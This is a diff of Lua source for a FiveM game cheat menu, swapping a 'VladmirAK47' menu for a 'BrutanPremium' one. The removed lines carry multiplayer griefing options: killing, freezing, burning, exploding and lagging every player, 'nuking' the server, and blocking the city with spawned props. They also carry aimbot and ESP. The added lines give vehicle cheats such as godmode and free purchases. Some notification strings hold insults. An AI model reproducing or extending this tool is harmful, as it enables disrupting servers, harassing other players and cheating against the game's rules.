-            elseif VladmirAK47.IsMenuOpened('matte2') then
-                for dK, em in pairs(bt) do
-                    tp, ts = GetVehicleColours(veh)
-                    if ts == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and ts == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    curprim, cursec = GetVehicleColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            bh = table.pack(oldprim, oldsec)
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = true
-                        elseif bg and cursec == em.id then
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and cursec ~= em.id then
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('metal2') then
-                for dK, em in pairs(bu) do
-                    tp, ts = GetVehicleColours(veh)
-                    if ts == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and ts == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    curprim, cursec = GetVehicleColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            bh = table.pack(oldprim, oldsec)
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = true
-                        elseif bg and cursec == em.id then
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and cursec ~= em.id then
-                            SetVehicleColours(veh, oldprim, em.id)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('classic3') then
-                for dK, em in pairs(br) do
-                    _, ts = GetVehicleExtraColours(veh)
-                    if ts == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and ts == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    _, currims = GetVehicleExtraColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
-                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = true
-                        elseif bg and currims == em.id then
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and currims ~= em.id then
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('metallic3') then
-                for dK, em in pairs(br) do
-                    _, ts = GetVehicleExtraColours(veh)
-                    if ts == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and ts == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    _, currims = GetVehicleExtraColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
-                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = true
-                        elseif bg and currims == em.id then
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and currims ~= em.id then
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('matte3') then
-                for dK, em in pairs(bt) do
-                    _, ts = GetVehicleExtraColours(veh)
-                    if ts == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and ts == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    _, currims = GetVehicleExtraColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
-                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = true
-                        elseif bg and currims == em.id then
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and currims ~= em.id then
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('metal3') then
-                for dK, em in pairs(bu) do
-                    _, ts = GetVehicleExtraColours(veh)
-                    if ts == em.id and not bg then
-                        pricetext = 'Installed'
-                    else
-                        if bg and ts == em.id then
-                            pricetext = 'Previewing'
-                        else
-                            pricetext = 'Not Installed'
-                        end
-                    end
-                    _, currims = GetVehicleExtraColours(veh)
-                    if VladmirAK47.Button(em.name, pricetext) then
-                        if not bg then
-                            bi = 'paint'
-                            bk = false
-                            oldprim, oldsec = GetVehicleColours(veh)
-                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
-                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = true
-                        elseif bg and currims == em.id then
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bg and currims ~= em.id then
-                            SetVehicleExtraColours(veh, oldpearl, em.id)
-                            bg = true
-                        end
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('VehicleMenu') then
-                if VladmirAK47.MenuButton('~h~~p~▶~s~ Vehicle List', 'CarTypes') then				
-				elseif VladmirAK47.MenuButton('~h~~p~▶~s~ ~h~LSC Customs', 'LSC') then
-                elseif VladmirAK47.MenuButton('~h~~p~▶~s~ Vehicle Boost', 'BoostMenu') then
-                elseif VladmirAK47.MenuButton('~h~~p~▶~s~ Nearest vehicle Destroyer', 'GCT') then
-                elseif VladmirAK47.MenuButton('~h~~p~▶~s~ Spawn & Attach Trailer', 'MainTrailer') then
-                elseif VladmirAK47.Button('~h~Spawn Custom ~s~Vehicle') then
-                    ca()
-                elseif VladmirAK47.Button('~h~Delete ~s~Vehicle') then
-                    DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
-                elseif VladmirAK47.Button('~h~Repair ~s~Vehicle') then
-                    cc()
-                elseif VladmirAK47.Button('~h~Repair ~s~Engine') then
-                    cd()
-                elseif VladmirAK47.Button('~h~Flip ~s~Vehicle') then
-                    daojosdinpatpemata()
-                elseif VladmirAK47.Button('~h~~b~Max ~s~Tuning') then
-                    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
-                elseif VladmirAK47.Button('~h~RC ~s~Car') then
-                    ce()
-                    VladmirAK47.CloseMenu()
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~No Fall',
-                        Nofall,
-                        function(dR)
-                            Nofall = dR
-                            SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall)
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Vehicle Godmode',
-                        VehGod,
-                        function(dR)
-                            VehGod = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Speedboost SHIFT CTRL',
-                        VehSpeed,
-                        function(dR)
-                            VehSpeed = dR
-                        end
-                    )
-                 then
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('GCT') then
-                if
-                    VladmirAK47.CheckBox(
-                        '~h~Engine off Nearest Vehicles',
-                        destroyvehicles,
-                        function(dR)
-                            destroyvehicles = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Delete Nearest Vehicles/Entity',
-                        deletenearestvehicle,
-                        function(dR)
-                            deletenearestvehicle = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Explode Nearest Vehicles',
-                        explodevehicles,
-                        function(dR)
-                            explodevehicles = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~~p~Fuck Nearest Vehicles',
-                        fuckallcars,
-                        function(dR)
-                            fuckallcars = dR
-                        end
-                    )
-                 then
-                end																		 
-				VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('OnlinePlayerMenu1') then
-			if VladmirAK47.Button('~h~Stuipd Objects on them') then
-                    bananapartyall()
-					elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Kick from veh~s~ All players',
-                        freezeall,
-                        function(dR)
-                            freezeall = dR
-                        end
-                    )
-                 then
-                elseif VladmirAK47.Button('~h~Silent Nuke') then
-                if not test1998 then
-                 test1998 = true
-                        av('~h~~b~ON~.', false)
-                else
-                 test1998 = false
-                        av('~h~~b~Off.', false)
-                end					 
-                elseif VladmirAK47.Button('~h~Brutan Wall') then
-                 NukeServer1()
-                elseif VladmirAK47.Button('~h~Send the owner to Brutan Mansion') then
-                if not test1997 then
-                 test1997 = true
-                        av('~h~~b~ON~.', false)
-                else
-                 test1997 = false
-                        av('~h~~b~Off.', false)
-                end				 
-                elseif VladmirAK47.Button('~h~Close the centre of the city ') then				 
-                local bH1 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 37.29, -929, 29, true, true, true)				
-                local bH = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 37.29, -946, 29, true, true, true)
-                local bI = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 5.37, -957, 29, true, true, true)
-                local bJ = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 129.14, -916, 26.1, true, true, true)	
-                local bJ2 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 28.14, -929, 29.1, true, true, true)
-                local bJ3 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 46.14, -1116, 29.1, true, true, true)
-                local bJ4 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 46.89, -1115, 29.1, true, true, true)
-                local bJ5 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 111.14, -981, 29.1, true, true, true)
-                local bJ6 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 200.14, -1112.15, 29.1, true, true, true)
-				 local bJ7 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 215.14, -1112.15, 29.1, true, true, true)
-                local bJ8 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 305.14, -1119, 29.1, true, true, true)
-                local bJ9 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 999.14, -1123.15, 29.1, true, true, true)
-                local bJ10 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 186.14, -1064.15, 29.1, true, true, true)	
-                local bJ13 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 740.14, -1016.15, 29.1, true, true, true)
-                local bJ14 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 739.14, -1003.15, 26.1, true, true, true)		
-                local bJ15 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 768.14, -1044.15, 27.1, true, true, true)	
-                local bJ16 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 188, -956, 27.1, true, true, true)
-                local bJ17 = CreateObject(GetHashKey('stt_prop_race_start_line_03b'), 102.14, -936.15, 29.1, true, true, true)
-				                local bH1 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 37.29, -929, 29, true, true, true)				
-                local b3H = CreateObject(GetHashKey('stt_prop_track_straight_l'), 37.29, -946, 29, true, true, true)
-                local b4I = CreateObject(GetHashKey('stt_prop_track_straight_l'), 5.37, -957, 29, true, true, true)
-                local b5J = CreateObject(GetHashKey('stt_prop_track_straight_l'), 129.14, -916, 26.1, true, true, true)	
-                local b1J2 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 28.14, -929, 29.1, true, true, true)
-                local b6J3 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 46.14, -1116, 29.1, true, true, true)
-                local b8J4 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 46.89, -1115, 29.1, true, true, true)
-                local b7J5 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 111.14, -981, 29.1, true, true, true)
-                local b9J6 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 200.14, -1112.15, 29.1, true, true, true)
-				 local b0J7 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 215.14, -1112.15, 29.1, true, true, true)
-                local b00J8 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 305.14, -1119, 29.1, true, true, true)
-                local b000J9 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 999.14, -1123.15, 29.1, true, true, true)
-                local b12J10 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 186.14, -1064.15, 29.1, true, true, true)	
-                local b13J13 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 740.14, -1016.15, 29.1, true, true, true)
-                local b14J14 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 739.14, -1003.15, 26.1, true, true, true)		
-                local b15J15 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 768.14, -1044.15, 27.1, true, true, true)	
-                local bJ616 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 188, -956, 27.1, true, true, true)
-                local bJ317 = CreateObject(GetHashKey('stt_prop_track_straight_l'), 102.14, -936.15, 29.1, true, true, true)
-                 av('~h~~b~You did them dirty :O~s~.', false)	
-                elseif VladmirAK47.Button('~h~Freeze Everyone ') then
-				                 runOnAll(Freezeall2)							 
-                elseif VladmirAK47.Button('~h~Zomibe Everyone ') then
-				                 runOnAll(Zombie)
-                elseif VladmirAK47.Button('~h~Silent Kill Everyone ') then
-				                 runOnAll(Silentkill)
-                elseif VladmirAK47.Button('~h~1M veh on all ') then
-				                 runOnAll(Zombie99)								 
-                elseif VladmirAK47.Button('~h~Lag all ') then
-                if not TEST30 then
-                 TEST30 = true
-                        av('~h~~b~ Dirty Bitch u r~.', false)
-                else
-                 TEST30 = false
-                        av('~h~~b~ Off.', false)
-                end									 
-                elseif VladmirAK47.Button('~h~BurnV2 Everyone ') then
-				                 runOnAll(BurnV2)
-                elseif VladmirAK47.Button('~h~Burn Everyone ') then
-				                 runOnAll(BurnV1)							 
-                elseif VladmirAK47.Button('~h~Fail Peds ') then
-				                 runOnAll(Failall)								 
-                elseif VladmirAK47.Button('~h~Smoke Everyone ') then
-				                 runOnAll(Smoking)								 
-                elseif VladmirAK47.Button('~h~Launch Everyone ') then
-				                 runOnAll(Launch)
-                elseif VladmirAK47.Button('~h~Explode all ') then
-				                 runOnAll(Launch1)
-                elseif VladmirAK47.Button('~h~Light all ') then
-				                 runOnAll(Light1)									 
-                elseif VladmirAK47.Button('~h~Try to teleport vehicles to place') then
-				                 runOnAll(TeleportToMe)								 			 
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('MiscMenu') then
-                if VladmirAK47.MenuButton('~h~~r~▶~s~ Crosshairs', 'CsMenu') then
+            elseif BrutanPremium.Button("Repair Vehicle") then
+                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
+                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
+                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
+                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+					elseif BrutanPremium.Button("Repair Engine Only") then
+					    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
+    if not DoesEntityExist(veh) then
+        drawNotification(
+            "~r~You Aren't Sitting In A Vehicle Stupid"
+        )
+    else
+				SetVehicleUndriveable(veh,false)
+				SetVehicleEngineHealth(veh, 1000.0)
+				SetVehiclePetrolTankHealth(veh, 1000.0)
+				healthEngineLast=1000.0
+				healthPetrolTankLast=1000.0
+					SetVehicleEngineOn(veh, true, false )
+				SetVehicleOilLevel(veh, 1000.0)
+		end
+						elseif BrutanPremium.Button("~g~Buy vehicle for free") then fv()
 				elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Player Blips',
-                        yx,
-                        function(yx)
+					BrutanPremium.CheckBox(
+					"~r~~h~Ultra Speed",
+					Nigubdddddd,
+					function(enabled)
+					Nigubdddddd = enabled
+					end)
+				then
+					elseif
+					BrutanPremium.CheckBox(
+					"~w~Rainbow Vehicle Colour",
+					RainbowVeh,
+					function(enabled)
+					RainbowVeh = enabled
+					end)
+				then
+				elseif
+					BrutanPremium.CheckBox(
+					"~w~Rainbow Vehicle Neon",
+					ou328hNeon,
+					function(enabled)
+					ou328hNeon = enabled
+					end)
+				then
+				elseif
+					BrutanPremium.CheckBox(
+					"~w~Rainbow Sync",
+					ou328hSync,
+					function(enabled)
+					ou328hSync = enabled
+					end)
+				then
+				elseif
+					BrutanPremium.CheckBox(
+					"Keep Vehicle Clean",
+					LOJWDNDDNDN,
+					function(enabled)
+					LOJWDNDDNDN = enabled
+					end)
+				then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~LS Customs", "LSC") then
+				                elseif
+                    BrutanPremium.CheckBox(
+                        'Speedboost ~g~SHIFT ~r~CTRL',
+                        VehSpeed,
+                        function(dl)
+                            VehSpeed = dl
                         end
                     )
                  then
-                    cL = not cL
-                    yx = cL					
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Aimbot',
-                        TriggerBot,
-                        function(dR)
-                            TriggerBot = dR
-                        end
-                    )
-                 then			 
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~ESP Name',
-                        cN,
-                        function(dR)
-                            cN = dR
-                            cM = false
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~ESP Lines',
-                        esp,
-                        function(dR)
-                            esp = dR
-                        end
-                    )
-                 then			 
-				elseif VladmirAK47.Button('~h~Set Weather Clear') then
-					 SetWeatherTypePersist("CLEAR")
-                     SetWeatherTypeNowPersist("CLEAR")
-                     SetWeatherTypeNow("CLEAR")
-                     SetOverrideWeather("CLEAR")
-				elseif VladmirAK47.Button('~h~Set Weather EXTRASUNNY') then
-					 SetWeatherTypePersist("EXTRASUNNY")
-                     SetWeatherTypeNowPersist("EXTRASUNNY")
-                     SetWeatherTypeNow("EXTRASUNNY")
-                     SetOverrideWeather("EXTRASUNNY")
-				elseif VladmirAK47.Button('~h~Set Weather FOGGY') then
-					 SetWeatherTypePersist("FOGGY")
-                     SetWeatherTypeNowPersist("FOGGY")
-                     SetWeatherTypeNow("FOGGY")
-                     SetOverrideWeather("FOGGY")
-				elseif VladmirAK47.Button('~h~Set Weather BLIZZARD') then
-					 SetWeatherTypePersist("BLIZZARD")
-                     SetWeatherTypeNowPersist("BLIZZARD")
-                     SetWeatherTypeNow("BLIZZARD")
-                     SetOverrideWeather("BLIZZARD")					 
-                end					 
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('CsMenu') then
-                if
-                    VladmirAK47.CheckBox(
-                        '~h~Original Crosshair',
-                        crosshair,
-                        function(dR)
-                            crosshair = dR
-                            crosshairc = false
-                            crosshairc2 = false
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~CROSS Crosshair',
-                        crosshairc,
-                        function(dR)
-                            crosshair = false
-                            crosshairc = dR
-                            crosshairc2 = false
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~DOT ~Crosshair',
-                        crosshairc2,
-                        function(dR)
-                            crosshair = false
-                            crosshairc = false
-                            crosshairc2 = dR
-                        end
-                    )
-                 then
+                elseif BrutanPremium.Button("Delete Vehicle") then
+                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
+				elseif BrutanPremium.Button("Delete Closest Vehicle") then
+                        local PlayerCoords = GetEntityCoords(PlayerPedId())
+                        DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
+				elseif
+					BrutanPremium.CheckBox(
+						"No Fall",
+						Nofall,
+						function(enabled)
+							Nofall = enabled
+
+							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
+						end
+					)
+				 then
+				elseif BrutanPremium.Button("Change license plate") then
+					local playerPed = GetPlayerPed(-1)
+					local playerVeh = GetVehiclePedIsIn(playerPed, true)
+					local result = KeyboardInput("Enter the plate license you want", "", 10)
+					if result then
+						SetVehicleNumberPlateText(playerVeh, result)
+						end
+						                elseif BrutanPremium.CheckBox(
+                    "Vehicle Godmode",
+                    VehGod,
+                    function(enabled)
+                        VehGod = enabled
+                    end)
+                then
+				elseif BrutanPremium.Button("Flip Up Vehicle") then
+				local ped = GetPlayerPed(-1)
+		        local veh = GetVehiclePedIsIn(ped)
+	             FreezeEntityPosition(veh,false)
+	             SetVehicleOnGroundProperly(veh)
+	            SetVehicleEngineOn(veh, true)
+				elseif BrutanPremium.Button("Make vehicle dirty") then
+					Clean(GetVehiclePedIsUsing(PlayerPedId()))
+					drawNotification("~r~Vehicle is now dirty")
+				elseif BrutanPremium.Button("Make vehicle clean") then
+					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
+					drawNotification("~r~Vehicle is now clean")
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('Vladmir1997') then
-                if VladmirAK47.Button('~h~~p~▶~s~ This menu created by VladmirAK47 ~r~ For Crown') then
-                    av('~h~~o~WoW~s~.', false)	
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('WeaponTypes') then
-                for e0, ev in pairs(b7) do
-                    if VladmirAK47.MenuButton('~h~~p~▶~s~ ' .. e0, 'WeaponTypeSelection') then
-                        dy = ev
+
+                BrutanPremium.Display()
+			elseif BrutanPremium.IsMenuOpened("tunings") then 
+                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
+                    for i, dA in pairs(bd) do
+                        if dA.
+                    id == "extra"
+                    and# checkValidVehicleExtras()  ~= 0 then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
+                    then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
+                    then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
+                    then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
+                    then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end
+                    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
+                        if BrutanPremium.MenuButton(dA.name, dA.id) then end;
+                    break end end end;
+                    if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
+                    else xenonStatus = "Not Installed"
+                    end;
+                    if BrutanPremium.Button("Xenon Headlight", xenonStatus) then
+                    if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
+                    else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; 
+                    
+                    BrutanPremium.Display() 
+                elseif BrutanPremium.IsMenuOpened("performance") then 
+                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
+                    for i, dA in pairs(be) do
+                        if BrutanPremium.MenuButton(dA.name, dA.id) then 
+                        end 
                     end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('WeaponTypeSelection') then
-                for e0, ev in pairs(dy) do
-                    if VladmirAK47.MenuButton(ev.name, 'WeaponOptions') then
-                        dz = ev
+                    if IsToggleModOn(veh, 18) then 
+                        turboStatus = "Installed"
+                    else 
+                        turboStatus = "Not Installed"
                     end
+                    if BrutanPremium.Button("Turbo Tune", turboStatus) then
+                        if not IsToggleModOn(veh, 18) then 
+                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
+                        else 
+                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) 
+                        end 
+                    end 
+                    BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("primary") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic1") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic1") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte1") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal1") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("secondary") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic2") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic2") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte2") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal2") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("rimpaint") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic3") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic3") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte3") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal3") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic1") then
+                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and tp == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic1") then
+                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and tp == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte1") then
+                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if tp ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and tp == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal1") then
+                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if tp ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and tp == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
